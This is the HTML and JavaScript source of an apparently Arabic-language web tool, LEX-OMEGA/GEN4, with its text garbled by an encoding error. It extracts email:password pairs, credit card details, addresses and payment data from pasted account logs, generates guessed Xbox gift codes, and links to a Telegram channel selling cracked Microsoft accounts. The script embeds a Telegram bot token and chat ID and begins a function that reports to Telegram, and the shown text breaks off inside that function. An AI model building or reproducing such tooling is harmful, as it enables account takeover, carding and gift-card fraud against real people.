<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <title>Ø£Ø¯Ø§Ø© LEX-OMEGA/GEN4 (Ø§Ù„Ù…Ø­Ù€Ù€Ù€Ø¯Ø«Ø©n): Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø±Ø§Ø¨Ø¹ Ù„Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¹Ù…ÙŠÙ‚</title>
    <style>
        /* Ø³ØªØ§ÙŠÙ„Ø§Øª Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø±Ø§Ø¨Ø¹ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© (GEN4) - Ù…ÙØ¹Ø¯Ù‘ÙÙ„Ø© Ù„Ù„Ø£Ù„ÙˆØ§Ù† Ø§Ù„Ù…Ø±ÙŠØ­Ø© */
        :root {
            --bg: #030a18; /* ÙƒØ­Ù„ÙŠ ØºØ§Ù…Ù‚ Ø¬Ø¯Ø§Ù‹ - Ø£Ø³Ø§Ø³ÙŠ */
            --card: #0e1a2c; /* Ø£Ø²Ø±Ù‚ Ø¯Ø§ÙƒÙ† Ù„Ù„Ù‚ÙˆØ§Ø¦Ù… - Ù…Ø±ÙŠØ­ */
            --accent: #00bcd4; /* GEN4: Ø³Ù…Ø§ÙˆÙŠ Ù…Ø±ÙŠØ­ (Ø¨Ø¯Ù„ Ø§Ù„Ø°Ù‡Ø¨ÙŠ) */
            --pro-accent: #00e676; /* PRO: Ù„ÙˆÙ† Ø£Ø®Ø¶Ø± Ù†ÙŠÙˆÙ† - Ù…Ø±ÙŠØ­ */
            --guesser-accent: #ff3d00; /* GUESSER: Ù„ÙˆÙ† Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ Ù…Ø­Ø±ÙˆÙ‚ Ù„Ù„ØªÙ†Ø¨ÙŠÙ‡ */
            --guesser-card: #2c1a0e;
            --grad: linear-gradient(135deg, #00bcd4, #0097a7); /* ØªØ¯Ø±Ø¬ Ø³Ù…Ø§ÙˆÙŠ */
            --dark-grad: linear-gradient(135deg, #1f314d, #14213d);
            --guesser-grad: linear-gradient(135deg, #ff3d00, #b22a00);
            --success-color: #00e676;
            --price-color: #ffeb3b; /* Ø£ØµÙØ± Ù†ÙŠÙˆÙ† Ù„Ù„Ø±ØµÙŠØ¯ */
            --text-color: #f0f0f0;
            --border-color: #314d7a; /* Ø­Ø¯ÙˆØ¯ Ø²Ø±Ù‚Ø§Ø¡ Ø¯Ø§ÙƒÙ†Ø© */
            --ultra-cc-color: #e65100; /* Ø¨Ø±ØªÙ‚Ø§Ù„ÙŠ ØºØ§Ù…Ù‚ Ù„Ù„Ù€ CC FULL */
            --splash-bg: #000;
        }
        
        /* Ø³ØªØ§ÙŠÙ„Ø§Øª ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ (Splash Screen) */
        #splash-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--splash-bg);
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            opacity: 1;
            transition: opacity 1s ease-out;
        }
        #splash-content {
            text-align: center;
            color: var(--text-color);
        }
        #splash-content h1 {
            font-size: 40px;
            color: var(--accent);
            text-shadow: 0 0 15px rgba(0, 188, 212, 0.7); /* Ø¸Ù„ Ø³Ù…Ø§ÙˆÙŠ */
            margin: 0;
            animation: pulse 1.5s infinite alternate;
        }
        #splash-content p {
            font-size: 18px;
            color: #9aa8bc;
            margin-top: 10px;
            font-weight: 500;
        }
        .loader {
            border: 4px solid var(--card);
            border-top: 4px solid var(--success-color);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin-top: 30px;
        }
        @keyframes pulse {
            from { transform: scale(1); opacity: 0.9; }
            to { transform: scale(1.05); opacity: 1; }
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Ø³ØªØ§ÙŠÙ„Ø§Øª Ø§Ù„Ø£Ø¯Ø§Ø© Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© */
        body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial; background: var(--bg); padding-top: 20px; padding-bottom: 50px; min-height: 100vh; color: var(--text-color); }
        .wrap { max-width: 900px; margin: 0px auto; padding: 15px; position: relative; }
        .card { background: var(--card); border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.9); margin-bottom: 25px; border: 2px solid var(--border-color); position: relative; overflow: hidden; }
        .card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: var(--grad); }
        .pro-tool-card h1 { color: var(--pro-accent) !important; }
        .guesser-tool-card h1 { color: var(--guesser-accent) !important; }
        h1 { margin: 6px 0 20px; font-size: 28px; text-align: center; color: var(--text-color); font-weight: 800; }
        textarea { width: 100%; min-height: 200px; padding: 18px; font-size: 16px; border-radius: 15px; border: 3px solid var(--border-color); resize: vertical; background: #081221; color: #fff; transition: border-color 0.3s; }
        textarea:focus { border-color: var(--accent); outline: none; }
        #output-guesser { min-height: 80px; font-size: 20px; text-align: center; font-weight: bold; letter-spacing: 2px; }
        .row { display: flex; gap: 15px; margin-top: 15px; flex-wrap: wrap; justify-content: center; }
        button { border: none; cursor: pointer; padding: 14px 22px; border-radius: 12px; font-size: 16px; transition: .4s; font-weight: 700; text-transform: uppercase; }
        .btn-red { background: var(--grad); color: #000; box-shadow: 0 0 15px rgba(0, 188, 212, 0.7); } /* Ø²Ø± Ø³Ù…Ø§ÙˆÙŠ */
        .btn-red:hover { transform: translateY(-4px); box-shadow: 0 0 25px rgba(0, 188, 212, 1); }
        .btn-black { background: var(--dark-grad); color: #fff; border: 2px solid #314d7a; }
        .btn-black:hover { background: #14213d; }
        .btn-guesser-primary { background: var(--guesser-grad); color: #fff; box-shadow: 0 4px 15px rgba(255, 61, 0, 0.5); }
        .btn-guesser-primary:hover { transform: translateY(-4px); box-shadow: 0 6px 20px rgba(255, 61, 0, 0.8); }
        .list { margin-top: 25px; display: flex; flex-direction: column; gap: 15px; }
        .item { display: flex; justify-content: space-between; align-items: flex-start; padding: 18px; border-bottom: 1px solid #1f314d; background: #081221; border-radius: 15px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.6); flex-wrap: wrap;}
        .email { font-weight: 800; color: var(--accent); font-size: 17px; width: 100%; margin-bottom: 8px;}
        .pw { font-size: 15px; color: #ddd; font-weight: 600; display: flex; align-items: center; flex-wrap: wrap; margin-bottom: 10px;}
        /* ... (Ø³ØªØ§ÙŠÙ„Ø§Øª Ø§Ù„Ù…Ù„Ø§Ø­Ø¸Ø§Øª Ø§Ù„Ù…Ø­Ø¯Ø«Ø©) */
        .gamepass-note, .price-note, .cc-note, .address-note, .ultra-cc-color, .feature-note, .security-note, .payment-detected-note { font-weight: 700; margin-right: 8px; white-space: nowrap; flex-shrink: 0; padding: 3px 8px; border-radius: 6px; font-size: 13px; margin-top: 5px; display: inline-flex; align-items: center;}
        .gamepass-note { color: var(--success-color); background: #081221; border: 1px solid var(--success-color); }
        .price-note { color: var(--price-color); background: #081221; border: 1px solid var(--price-color); }
        .cc-note { color: #2196f3; background: #081221; border: 1px solid #2196f3; }
        .address-note { color: #8bc34a; background: #081221; border: 1px solid #8bc34a; }
        .ultra-cc-note { color: #fff; background: var(--ultra-cc-color); }
        .feature-note { color: #ffeb3b; background: #081221; border: 1px solid #ffeb3b; }
        .security-note { color: #ff3d00; background: #081221; border: 1px solid #ff3d00; }
        .payment-detected-note { color: #fff; background: #00bcd4; } /* New style for generic payment detection */
        
        .controls { display: flex; gap: 10px; flex-shrink: 0; margin-top: 10px; }
        .copy-btn { padding: 10px 14px; border-radius: 10px; font-size: 14px; font-weight: 600; }
        .hidden { display: none !important; }
        .processing { background: #ff9800 !important; color: #fff !important; cursor: not-allowed !important; pointer-events: none; }
        
        /* Ø³ØªØ§ÙŠÙ„Ø§Øª Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¹Ù„ÙˆÙŠØ© Ø§Ù„Ø«Ø§Ø¨ØªØ© */
        #menu-container { position: absolute; top: 25px; right: 25px; z-index: 50; }
        #menu-button { background: #1f314d; color: var(--accent); font-size: 22px; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); transition: 0.3s; border: 2px solid transparent; }
        #menu-button.active { border-color: var(--guesser-accent); } 
        #dropdown-menu { position: absolute; top: 55px; right: 0px; background: #14213d; border-radius: 10px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7); min-width: 280px; padding: 8px 0; white-space: nowrap; border: 1px solid #314d7a; }
        .menu-item { padding: 12px 18px; cursor: pointer; font-size: 15px; font-weight: 600; color: #eee; transition: background 0.2s; display: flex; align-items: center; border-left: 5px solid transparent; }
        .menu-item.active-tool { background: #1e0e0e; border-left-color: var(--guesser-accent); color: var(--guesser-accent); font-weight: 700; }
        .menu-item:hover { background: #1f314d; }
        .menu-item span { margin-left: 10px; }

        /* Ø³ØªØ§ÙŠÙ„Ø§Øª Ø§Ù„Ø±ÙˆØ§Ø¨Ø· Ø§Ù„Ø³Ø±ÙŠØ¹Ø© */
        .quick-links { margin-top: 40px; padding: 25px; background: #081221; border-radius: 18px; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6); border: 1px solid #1f314d; }
        .quick-links h2 { font-size: 28px; color: var(--pro-accent); border-bottom: 3px solid var(--pro-accent); padding-bottom: 12px; margin-bottom: 25px; text-align: center; font-weight: 800; }
        .link-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 18px; }
        
        /* Ø³ØªØ§ÙŠÙ„ Ø¬Ø¯ÙŠØ¯ Ù„ØªÙ…ÙŠÙŠØ² Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø£ÙˆÙ„ */
        .quick-link-btn { display: block; background: #14213d; padding: 18px; border-radius: 15px; text-decoration: none; color: var(--text-color); box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4); transition: transform 0.3s, box-shadow 0.3s; border-right: 5px solid var(--accent); }
        .quick-link-btn.featured {
             background: var(--guesser-card);
             border-right: 5px solid var(--guesser-accent);
             box-shadow: 0 4px 15px rgba(255, 61, 0, 0.5);
        }
        .quick-link-btn.featured .link-title { color: var(--guesser-accent); }
        .quick-link-btn:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.8); background: #1f314d; }
        .quick-link-btn.featured:hover { background: #3d2315; }

        .link-title { font-weight: 700; color: var(--accent); font-size: 16px; }
        .link-desc { font-size: 14px; color: #aaa; margin-top: 5px; }
        .footer { color: #555 !important; }
        /* Ø³ØªØ§ÙŠÙ„Ø§Øª Ø§Ù„ØªÙˆØ³Øª... ØªØ¨Ù‚Ù‰ ÙƒÙ…Ø§ Ù‡ÙŠ */
        #toast {
            visibility: hidden; min-width: 250px; background-color: #333; color: #fff; text-align: center; border-radius: 6px; padding: 16px; position: fixed; z-index: 100; left: 50%; transform: translateX(-50%); bottom: 30px; font-size: 17px; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
        }
    </style>
</head>
<body>

<div id="splash-screen">
    <div id="splash-content">
        <h1>LEX-OMEGA / GEN4</h1>
        <p>Ø§Ù„Ø¬ÙŠÙ„ Ø§Ù„Ø±Ø§Ø¨Ø¹ Ù„Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¹Ù…ÙŠÙ‚ ğŸ”¥</p>
        <div class="loader"></div>
    </div>
</div>

<div class="wrap" id="tool-page" style="opacity:0; transition: opacity 0.5s;">
    <div id="code-status"></div>

    <div id="menu-container">
        <button id="menu-button">
            <span>â˜°</span>
        </button>
        <div id="dropdown-menu" class="hidden">
            <div class="menu-item" onclick="switchTool('max')" data-tool="max">
                <span>Ø§Ù„Ø§Ø¯Ø§Ù‡ Ø§Ù„Ù†Ø³Ø®Ù‡ Ø§Ù„Ø¹Ø§Ø¯ÙŠÙ‡ (MAX)</span>
            </div>
            <div class="menu-item" onclick="switchTool('pro')" data-tool="pro">
                <span>Ø§Ù„Ø§Ø¯Ø§Ù‡ Ø§Ù„Ù†Ø³Ø®Ù‡ Ø§Ù„Ù…Ø­Ø³Ù†Ù‡ (PRO)</span>
            </div>
            <div class="menu-item" onclick="switchTool('guesser')" data-tool="guesser">
                <span>Ø§Ø¯Ø§Ù‡ ØªØ®Ù…ÙŠÙ† Ø§ÙƒÙˆØ§Ø¯ Ø±ØµÙŠØ¯ Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª</span>
            </div>
            <hr style="border-top: 1px solid #555; margin: 5px 0;">
            <div class="menu-item" onclick="promptAdminLogin()">
                <span>âš™ï¸ Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù†</span>
            </div>
        </div>
    </div>
    <div id="max-tool" class="tool-view">
        <div class="card">
            <h1><span style="color:var(--accent);font-size:36px;">â“</span> Ø£Ø¯Ø§Ø© MAX: Ø§Ø³ØªØ®Ø±Ø§Ø¬ Email:Password ÙˆØ§Ù„Ø£Ø³Ø§Ø³ÙŠØ§Øª</h1>
            <div style="text-align:center;color:#aaa;font-size:15px;margin-bottom:15px;font-weight:500;">
                Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ. Ø§Ù„Ø£Ø¯Ø§Ø© ØªØ³ØªØ®Ø±Ø¬ ÙÙ‚Ø·: <b style="color:var(--accent);">email:password</b> + ÙƒÙŠÙ… Ø¨Ø§Ø³ + Ø±ØµÙŠØ¯ + <b style="color:red;">ğŸ’³ Ø­Ø§Ù„Ø© Ø§Ù„Ø¯ÙØ¹</b>
            </div>
            <textarea id="input-max" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù‚ÙŠØ§Ø³ÙŠ Ù‡Ù†Ø§ (Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø£ÙˆÙ„)..."></textarea>
            <div class="row">
                <button onclick="parseText('max')" id="parseBtn-max" class="btn-red">Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ MAX</button>
                <button onclick="clearBtnMax.onclick()" id="clearBtnMax" class="btn-black">Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„</button>
                <button onclick="copyAllBtnMax.onclick()" id="copyAllBtnMax" class="btn-black">Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
                <button onclick="downloadBtnMax.onclick()" id="downloadBtnMax" class="btn-black">ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù txt</button>
            </div>
            <div class="list" id="list-max"></div>
        </div>
    </div>

    <div id="pro-tool" class="tool-view hidden">
        <div class="card" style="border-color:var(--pro-accent)">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(135deg, #00e676, #00c853);"></div>
            <h1><span style="color:var(--pro-accent);font-size:36px;">ğŸ”¥</span> Ø£Ø¯Ø§Ø© PRO: Ø§Ù„ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¹Ù…ÙŠÙ‚ (GEN4)</h1>
            <div style="text-align:center;color:#ccc;font-size:15px;margin-bottom:15px;font-weight:500;">
                Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù…Ø¹Ù‚Ø¯ Ù‡Ù†Ø§. ØªØ³ØªØ®Ø±Ø¬: <b style="color:var(--pro-accent);">email:password + CC FULL/PARTIAL + Address + Security & Features + ÙƒÙ„ Ø·Ø±Ù‚ Ø§Ù„Ø¯ÙØ¹ ğŸ’³</b>
            </div>
            <textarea id="input-pro" placeholder="Ø£Ù„ØµÙ‚ Ø§Ù„Ù†Øµ Ø§Ù„Ù…Ø¹Ù‚Ø¯ Ù‡Ù†Ø§ (Ø§Ù„Ù†Ù…ÙˆØ°Ø¬ Ø§Ù„Ø«Ø§Ù†ÙŠ)..."></textarea>
            <div class="row">
                <button onclick="parseText('pro')" id="parseBtn-pro" style="background:linear-gradient(135deg, #00e676, #00c853); color:#000; box-shadow: 0 0 15px rgba(0, 230, 118, 0.7);" class="btn-red">Ø§Ø³ØªØ®Ø±Ø§Ø¬ ÙˆØªØ¯Ù‚ÙŠÙ‚ PRO</button>
                <button onclick="clearBtnPro.onclick()" id="clearBtnPro" class="btn-black">Ù…Ø³Ø­ Ø§Ù„ÙƒÙ„</button>
                <button onclick="copyAllBtnPro.onclick()" id="copyAllBtnPro" class="btn-black">Ù†Ø³Ø® ÙƒÙ„ Ø§Ù„Ù†ØªØ§Ø¦Ø¬</button>
                <button onclick="downloadBtnPro.onclick()" id="downloadBtnPro" class="btn-black">ØªÙ†Ø²ÙŠÙ„ Ù…Ù„Ù txt</button>
            </div>
            <div class="list" id="list-pro"></div>
        </div>
    </div>

    <div id="guesser-tool" class="tool-view hidden">
        <div class="card" style="border-color:var(--guesser-accent)">
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: var(--guesser-grad);"></div>
            <h1><span style="color:var(--guesser-accent);font-size:36px;">ğŸ”‘</span> Ø£Ø¯Ø§Ø© ØªØ®Ù…ÙŠÙ† Ø£ÙƒÙˆØ§Ø¯ Ø±ØµÙŠØ¯ Ø§Ù„ÙˆÙ„Ø§ÙŠØ§Øª Ø§Ù„Ù…ØªØ­Ø¯Ø© (Xbox US)</h1>
            <div style="text-align:center;color:#ffdddd;font-size:16px;margin-bottom:28px;font-weight:500;">
                Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ "ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø¬Ø¯ÙŠØ¯" Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ÙƒÙˆØ¯ (25 Ø­Ø±Ù) Ø¬Ø§Ù‡Ø² Ù„Ù„Ù†Ø³Ø® ÙˆØ§Ù„ØªÙØ¹ÙŠÙ„.
            </div>
            
            <textarea id="output-guesser" placeholder="Ø§Ù„ÙƒÙˆØ¯ XXXXX-XXXXX-XXXXX-XXXXX-XXXXX ÙŠØ¸Ù‡Ø± Ù‡Ù†Ø§..." readonly></textarea>
            
            <div class="row">
                <button onclick="generateXboxCode()" id="generateBtn" class="btn-guesser-primary" style="color: #000; background: linear-gradient(135deg, #00bcd4, #0097a7);">ØªÙˆÙ„ÙŠØ¯ ÙƒÙˆØ¯ Ø¬Ø¯ÙŠØ¯ ğŸ”¥</button>
                <button onclick="copyGeneratedCode()" id="copyCodeBtn" class="btn-black" style="min-width: 150px;">Ù†Ø³Ø® Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„ÙƒØ§Ù…Ù„</button>
            </div>
            
            <div class="row">
                 <button onclick="window.open('https://redeem.microsoft.com/', '_blank'); showToast('ØªÙ… ÙØªØ­ ØµÙØ­Ø© ØªÙØ¹ÙŠÙ„ Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª');" id="redeemLinkBtn" class="btn-black" style="width: 100%; min-width: 100%;">ØµÙØ­Ø© Ø§Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± ğŸ</button>
            </div>
        </div>
    </div>
    
    <div class="quick-links">
        <h2>ğŸš€ Ø±ÙˆØ§Ø¨Ø· Ø§Ù„ÙˆØµÙˆÙ„ Ø§Ù„Ø³Ø±ÙŠØ¹ (Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª/Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³)</h2>
        <div class="link-grid">
            
            <a href="https://t.me/xgbox71" target="_blank" class="quick-link-btn featured">
                <div class="link-title">Ø­Ø³Ø§Ø¨Ø§Øª Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª Ù…ÙƒØ±ÙƒØ© (New) <span>ğŸ”¥</span></div>
                <div class="link-desc">Ù‚Ù†Ø§Ø© Ø§Ù„ØªÙ„Ø¬Ø±Ø§Ù… Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø­Ø³Ø§Ø¨Ø§Øª Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª.</div>
            </a>
            
            <a href="https://account.microsoft.com/account/manage" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø­Ø³Ø§Ø¨ <span>ğŸ’»</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª ÙˆØ§Ù„Ù…Ø´ØªØ±ÙŠØ§Øª ÙˆØ§Ù„Ø®Ø¯Ù…Ø§Øª.</div>
            </a>
            <a href="https://account.microsoft.com/billing/payments/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: Ø§Ù„Ø¯ÙØ¹ ÙˆØ§Ù„ÙÙˆØªØ±Ø© <span>ğŸ’³</span></div>
                <div class="link-desc">Ø¹Ø±Ø¶ ÙˆØ¥Ø¯Ø§Ø±Ø© Ø¨Ø·Ø§Ù‚Ø§Øª Ø§Ù„Ø¯ÙØ¹ ÙˆØ§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª Ø§Ù„Ù†Ø´Ø·Ø©.</div>
            </a>
            <a href="https://account.live.com/password/change" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ø§ÙŠÙƒØ±ÙˆØ³ÙˆÙØª: ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ø³Ø± <span>ğŸ”’</span></div>
                <div class="link-desc">Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù„ØªØ­Ø¯ÙŠØ« ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ©.</div>
            </a>
            <a href="https://account.live.com/proofs/Manage/signout" target="_blank" class="quick-link-btn">
                <div class="link-title">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬ Ù…Ù† ÙƒÙ„ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© <span>ğŸšª</span></div>
                <div class="link-desc">Ù„Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„Ø¬Ù„Ø³Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ© Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª.</div>
            </a>
            <a href="https://account.xbox.com/ar-SA/Account/Signin?returnUrl=https%3a%2f%2faccount.xbox.com%2far-SA%2fSettings" target="_blank" class="quick-link-btn">
                <div class="link-title">Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³: Ø¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª <span>ğŸ®</span></div>
                <div class="link-desc">Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ù…Ø¨Ø§Ø´Ø± Ù„Ø­Ø³Ø§Ø¨ Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³ ÙˆØ¥Ø¯Ø§Ø±Ø© Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª.</div>
            </a>
            <a href="https://redeem.microsoft.com/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ø¥ÙƒØ³ Ø¨ÙˆÙƒØ³: ØªÙØ¹ÙŠÙ„ ÙƒÙˆØ¯ (Redeem) <span>ğŸ</span></div>
                <div class="link-desc">Ù„ØªÙØ¹ÙŠÙ„ Ø£ÙƒÙˆØ§Ø¯ Ø§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª Ø£Ùˆ Ø§Ù„Ù‡Ø¯Ø§ÙŠØ§ Ù…Ø¨Ø§Ø´Ø±Ø©.</div>
            </a>
            
            <a href="https://t.me/xgbox71" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù‚Ù†Ø§Ø© ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ø£Ø¯Ø§Ø© (Telegram) <span>âš™ï¸</span></div>
                <div class="link-desc">Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¢Ø®Ø± Ø¥ØµØ¯Ø§Ø±Ø§Øª Ø£Ø¯Ø§Ø© LEX-OMEGA/GEN4.</div>
            </a>
            
            <a href="https://store.steampowered.com/login/" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ù†ØµØ© Steam: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ <span>ğŸ”¥</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù…Ù†ØµØ© Steam Ù„Ù„Ø£Ù„Ø¹Ø§Ø¨.</div>
            </a>
            <a href="https://store.epicgames.com/login" target="_blank" class="quick-link-btn">
                <div class="link-title">Ù…Ù†ØµØ© Epic Games: ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ <span>âš”ï¸</span></div>
                <div class="link-desc">ØµÙØ­Ø© Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø±Ø³Ù…ÙŠØ© Ù„Ù…Ù†ØµØ© Ø¥ÙŠØ¨Ùƒ Ø¬ÙŠÙ…Ø².</div>
            </a>
        </div>
    </div>

    <div class="footer" style="text-align:center;color:#444;font-size:14px;margin-top:30px;">
        Ø­Ù‚ÙˆÙ‚ Â© Telegram: <b>@xgbox7</b> | Ø£Ø¯Ø§Ø© LEX-OMEGA/GEN4 (Ø§Ù„Ù…Ø­Ø¯Ø«Ø©)
    </div>
</div>

<div id="admin-page" class="hidden" style="text-align:center; padding-top: 100px;">
    <h1 style="color: var(--pro-accent);">Ù„ÙˆØ­Ø© Ø§Ù„Ø£Ø¯Ù…Ù† âš™ï¸</h1>
    <p style="color:#9aa8bc; margin-bottom: 30px;">Ù‡Ù†Ø§ ØªÙƒÙˆÙ† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©.</p>
    <button onclick="navigateTo('tool')" class="btn-black">Ø§Ù„Ø±Ø¬ÙˆØ¹ Ù„Ù„Ø£Ø¯Ø§Ø©</button>
</div>

<div id="toast" class="toast"></div>

<script>
    // **********************************************
    // ** Ø«ÙˆØ§Ø¨Øª ÙˆØ¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù… **
    // **********************************************
    const ADMIN_CODE = "201180"; 
    const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; 
    const CHAT_ID = "7781990630"; 
    const DELAY_MS = 2500; 

    const toolPage = document.getElementById("tool-page");
    const adminPage = document.getElementById("admin-page");
    const splashScreen = document.getElementById("splash-screen");
    const toast = document.getElementById("toast");
    
    // Ø¹Ù†Ø§ØµØ± Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© 
    const menuButton = document.getElementById('menu-button');
    const dropdownMenu = document.getElementById('dropdown-menu');
    const menuContainer = document.getElementById('menu-container');
    const menuItems = document.querySelectorAll('#dropdown-menu .menu-item');

    // Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø£Ø¯ÙˆØ§Øª
    const maxToolView = document.getElementById('max-tool');
    const proToolView = document.getElementById('pro-tool');
    const guesserToolView = document.getElementById('guesser-tool'); 
    const outputGuesser = document.getElementById('output-guesser'); 
    const copyCodeBtn = document.getElementById('copyCodeBtn');

    // ... (Ø¨Ù‚ÙŠØ© Ø§Ù„Ø¹Ù†Ø§ØµØ±)
    const inputMax = document.getElementById("input-max");
    const listMax = document.getElementById("list-max");
    const clearBtnMax = document.getElementById("clearBtnMax");
    const copyAllBtnMax = document.getElementById("copyAllBtnMax");
    const downloadBtnMax = document.getElementById("downloadBtnMax");
    const parseBtnMax = document.getElementById("parseBtn-max");
    const inputPro = document.getElementById("input-pro");
    const listPro = document.getElementById("list-pro");
    const clearBtnPro = document.getElementById("clearBtnPro");
    const copyAllBtnPro = document.getElementById("copyAllBtnPro");
    const downloadBtnPro = document.getElementById("downloadBtnPro");
    const parseBtnPro = document.getElementById("parseBtn-pro");

    let currentTool = 'max'; 
    
    // (ÙˆØ¸Ø§Ø¦Ù Ø¹Ø§Ù…Ø© Ù…Ø³Ø§Ø¹Ø¯Ø©)
    function showToast(e) { 
        toast.textContent = e;
        toast.style.visibility = "visible";
        toast.style.animation = "fadein 0.5s, fadeout 0.5s 2.5s";
        setTimeout(() => { toast.style.visibility = "hidden"; }, 3000);
    }
    async function copyText(e) {
        try {
            await navigator.clipboard.writeText(e);
            return true;
        } catch (t) {
            console.error("Copy failed:", t);
            return false;
        }
    }
    
    function hashText(text) {
        let hash = 0, i, chr;
        if (text.length === 0) return hash.toString();
        const limitedText = text.substring(0, 1000); 
        for (i = 0; i < limitedText.length; i++) {
            chr = limitedText.charCodeAt(i);
            hash = ((hash << 5) - hash) + chr;
            hash |= 0; 
        }
        return Math.abs(hash).toString(16); 
    }
    
    function sendHashToTelegram(hash, toolType) { 
